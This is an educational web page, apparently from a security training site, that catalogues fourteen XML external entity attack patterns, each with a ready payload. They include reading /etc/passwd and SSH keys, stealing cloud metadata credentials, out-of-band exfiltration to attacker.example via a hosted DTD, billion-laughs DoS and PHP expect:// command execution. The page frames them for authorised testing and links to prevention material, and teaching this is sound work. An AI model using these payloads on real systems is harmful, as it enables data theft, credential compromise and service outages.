# XXE Attack Vectors

## Table of Contents

- [The Core Attack Flow](#the-core-attack-flow)
- [Preconditions an Attacker Looks For](#preconditions-an-attacker-looks-for)
- [Attack Patterns](#attack-patterns)
  1. [Classic In-Band File Disclosure](#1-classic-in-band-file-disclosure)
  2. [SSRF and Cloud Metadata Theft](#2-ssrf-and-cloud-metadata-theft)
  3. [Port Scanning the Internal Network](#3-port-scanning-the-internal-network)
  4. [Billion Laughs (Exponential DoS)](#4-billion-laughs-exponential-dos)
  5. [Quadratic Blowup DoS](#5-quadratic-blowup-dos)
  6. [External DTD to Bypass Restrictions](#6-external-dtd-to-bypass-restrictions)
  7. [Blind / Out-of-Band Exfiltration](#7-blind--out-of-band-exfiltration)
  8. [Error-Based Data Extraction](#8-error-based-data-extraction)
  9. [PHP Wrapper Abuse (base64 and RCE)](#9-php-wrapper-abuse-base64-and-rce)
  10. [XInclude Injection](#10-xinclude-injection)
  11. [XXE via SVG Upload](#11-xxe-via-svg-upload)
  12. [XXE via OOXML (DOCX / XLSX / PPTX)](#12-xxe-via-ooxml-docx--xlsx--pptx)
  13. [XXE in SOAP and XML-RPC](#13-xxe-in-soap-and-xml-rpc)
  14. [XXE in SAML Assertions](#14-xxe-in-saml-assertions)
- [Detection and Confirmation](#detection-and-confirmation)

## The Core Attack Flow

Every XXE attack, however exotic it looks, follows the same four steps. Keep this skeleton in mind and the fourteen patterns below become variations on one idea.

```
1. FIND an input that is parsed as XML
   (an obvious <xml> body, or a hidden one: SVG, DOCX, SOAP, SAML, RSS...)

2. INJECT a DOCTYPE with an entity declaration
   <!DOCTYPE x [ <!ENTITY payload SYSTEM "file:///etc/passwd"> ]>

3. TRIGGER resolution by referencing the entity
   <tag>&payload;</tag>         (or a parameter entity inside the DTD)

4. RECEIVE the result
   in-band   -> value reflected in the response
   blind     -> value shipped to attacker server via an HTTP/DNS callback
   error     -> value leaked inside a parser error message
```

## Preconditions an Attacker Looks For

- An endpoint that accepts `Content-Type: application/xml`, `text/xml`, or any XML-backed format (SVG, OOXML, SOAP, SAML, RSS, GPX, plist).
- A server-side parser that resolves DTDs and external entities—i.e., one that has *not* been hardened.
- For in-band attacks, some part of the parsed data being reflected back. For blind attacks, only outbound network access from the server is required.

> **Ethics and scope:** Every payload below is for use only against systems you own or are explicitly authorised to test. Point callbacks at your own listener, and use benign target files like `/etc/hostname` to prove impact without touching sensitive data.

## Attack Patterns

### 1. Classic In-Band File Disclosure

The textbook case: define an external entity pointing at a file and reference it where the value will be echoed back.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

If the endpoint returns the parsed `<data>` content, the response now contains the file. Useful high-value targets include `file:///etc/passwd`, application source (`file:///var/www/app/config.php`), cloud/SSH keys (`file:///root/.ssh/id_rsa`), and Windows equivalents (`file:///c:/windows/win.ini`). Files containing `<`, `>`, or `&` may break parsing when read this way—see pattern 9 for the base64 wrapper that solves this.

### 2. SSRF and Cloud Metadata Theft

Swap the `file://` scheme for `http://` and the parser makes a request *from the server*—server-side request forgery. The premier target on cloud instances is the link-local metadata service, which can return temporary credentials.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
```

This reaches internal-only services (admin consoles, databases with HTTP interfaces, orchestration dashboards) that are firewalled from the internet but fully reachable from the vulnerable host. Note that some metadata services now require a header-bearing token (IMDSv2), which a plain XXE GET cannot supply—so success depends on the target's configuration.

### 3. Port Scanning the Internal Network

Because the server dereferences the URL, differences in response time or error message let an attacker infer which internal hosts and ports are open—turning XXE into a blind internal port scanner.

```xml
<!DOCTYPE data [
  <!ENTITY probe SYSTEM "http://10.0.0.5:8080/">
]>
<data>&probe;</data>
```

A fast connection-refused error, a slow timeout, and a parser error containing a banner each reveal something different about the target port, allowing the attacker to map the internal network one entity at a time.

### 4. Billion Laughs (Exponential DoS)

This attack needs no external entities at all—only nested *internal* entities that expand exponentially. Ten entities, each referencing the previous one ten times, expand to 10^9 copies of the base string.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

A payload under a kilobyte forces the parser to build a multi-gigabyte string, exhausting memory and CPU. Because it is pure internal-entity expansion, disabling *external* entities alone does **not** stop it—you also need entity-expansion limits or a full DTD ban (covered in Prevention).

### 5. Quadratic Blowup DoS

A stealthier DoS that some entity-count limits miss: define one large entity and reference it many times in the body. There is no nesting, so naive "max entity depth" checks do not catch it, yet the total expanded size is (size × count).

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "AAAAAAAAAA...(50,000 chars)...">
]>
<bomb>&a;&a;&a;&a;&a; ... (repeated 50,000 times) ... </bomb>
```

Fifty thousand references to a fifty-thousand-character entity is a 2.5 GB expansion from a roughly 300 KB request.

### 6. External DTD to Bypass Restrictions

When the target strips or blocks an inline `DOCTYPE` body, or when the attack needs parameter-entity tricks that many parsers reject in the internal subset, the attacker hosts the malicious DTD elsewhere and references it:

```xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://attacker.example/evil.dtd">
<data>&send;</data>
```

The remote `evil.dtd` then contains the real logic. This also defeats some input filters that only inspect the request body, since the dangerous declarations arrive from a second fetch the parser performs itself.

### 7. Blind / Out-of-Band Exfiltration

When nothing is reflected, the attacker reads a file into a parameter entity and smuggles its contents into a URL the parser will contact. The hosted `evil.dtd` looks like this:

```xml
<!-- evil.dtd hosted on attacker.example -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/log?data=%file;'>">
%wrapper;
%exfil;
```

And the injected document simply pulls it in:

```xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://attacker.example/evil.dtd">
<data>probe</data>
```

The attacker's web log receives a request whose query string is the contents of `/etc/passwd`. The `&#x25;` is a numeric character reference for `%`, needed so the inner parameter entity is declared but not expanded until the wrapper runs. When outbound HTTP is filtered, the same trick over DNS (encoding data into subdomain labels) often still succeeds.

### 8. Error-Based Data Extraction

If the application returns parser error messages, the attacker can force the file contents into an error. A common technique references the file inside an entity whose target is an invalid path, so the parser reports the (now file-laden) value in its error:

```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser tries to open a path that includes the file's contents, fails, and echoes the bogus path—file data and all—in the error string returned to the attacker. This is the fallback when there is neither reflection nor reliable outbound network access.

### 9. PHP Wrapper Abuse (base64 and RCE)

On PHP targets, URL wrappers massively extend XXE. The `php://filter` wrapper base64-encodes a file so that binary or markup-laden files (which would otherwise break the XML) come back cleanly:

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM
    "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<data>&xxe;</data>
```

If the rarely-enabled `expect://` wrapper is present, XXE escalates to command execution (`expect://id`). The `data://` wrapper can inline a whole DTD. These wrappers are the main reason PHP XXE is often more severe than the file-read on other platforms.

### 10. XInclude Injection

Sometimes the attacker controls only a fragment of a server-built XML document and cannot add a `DOCTYPE` at all. If the parser supports XInclude, a single element with the XInclude namespace pulls in a file without any DTD:

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</data>
```

This matters because "we don't accept a full XML document, only a field" is a common but false sense of safety—XInclude needs no DOCTYPE and no root-level control.

### 11. XXE via SVG Upload

SVG is XML. An application that renders, rasterises, or extracts metadata from uploaded SVG images will happily parse an embedded DTD:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">
  <text x="10" y="40">&xxe;</text>
</svg>
```

When the server converts the SVG to PNG, the rendered image contains the file contents as visible text—an in-band leak through an "image" feature.

### 12. XXE via OOXML (DOCX / XLSX / PPTX)

Office documents are ZIP archives of XML parts. An attacker unzips a valid `.docx`, injects a DOCTYPE into one of the internal XML files (for example `word/document.xml` or `[Content_Types].xml`), and re-zips it:

```xml
<!-- word/document.xml, after injection -->
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://attacker.example/leak"> ]>
<w:document ...> ... &xxe; ... </w:document>
```

Any server-side document processor—text extraction, preview generation, format conversion—that parses these parts without hardening is vulnerable, even though the user "only uploaded a Word file."

### 13. XXE in SOAP and XML-RPC

SOAP and XML-RPC are XML by definition, so the DOCTYPE simply goes at the top of the request envelope:

```xml
<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser><id>&xxe;</id></getUser>
  </soap:Body>
</soap:Envelope>
```

Legacy enterprise services are a rich hunting ground because they predate secure parser defaults and are often internal-facing, making SSRF payloads especially valuable.

### 14. XXE in SAML Assertions

SAML single sign-on parses attacker-supplied XML *before authentication*. A crafted `SAMLResponse` containing a DOCTYPE can trigger XXE against the identity or service provider with no valid account at all:

```xml
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>
  <saml:Assertion><saml:Subject><saml:NameID>&xxe;</saml:NameID>
  </saml:Subject></saml:Assertion>
</samlp:Response>
```

Because it is unauthenticated and reaches security-critical infrastructure, SAML XXE is among the highest-severity variants.

## Detection and Confirmation

- **Reflect a benign entity first**: define `<!ENTITY test "ok">` and confirm `&test;` is expanded in the response—proof the parser processes DTDs before you touch any file.
- **Use a callback listener**: point a `SYSTEM` URL at a server you control (or a collaborator/interaction tool) and watch for the inbound request—the definitive test for blind XXE.
- **Prefer safe targets**: `file:///etc/hostname` and `file:///c:/windows/win.ini` prove file read without exposing secrets.
- **Try every XML-backed format**: if a JSON endpoint rejects XML, resend with `Content-Type: application/xml`; test SVG/DOCX upload paths; some frameworks parse XML even when JSON is the documented format.
- **Watch timing**: for DoS and port-scan variants, response-time differences are the signal—test expansion payloads only in environments where an outage is acceptable.

## Next Steps

- **[Prevention](prevention.html)**: Shut every one of these vectors with per-parser hardening.
- **[Examples](examples.html)**: See vulnerable-vs-secure parser code in four languages.
- **[Overview](overview.html)**: Revisit the concepts behind entities and DTDs.
- **[Hands-On Lab](./lab/xml-external-entities/)**: Try these techniques safely against a running target.
